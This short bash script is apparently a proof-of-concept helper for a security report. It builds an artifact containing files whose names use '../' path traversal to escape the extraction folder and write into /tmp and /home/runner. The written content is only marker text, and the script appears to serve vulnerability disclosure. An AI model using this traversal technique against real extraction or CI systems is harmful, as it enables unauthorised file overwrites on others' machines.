#!/bin/bash
echo "Creating path traversal test files..."

# Create normal directory structure
mkdir -p fonts

# Create files that will escape during extraction
echo "POC: Arbitrary File Write - This should be in /tmp/" > fonts/../../../tmp/reddit_poc.txt
echo "POC: Another traversal file" > fonts/../../../../home/runner/reddit_poc2.txt

echo "Malicious files created for artifact"
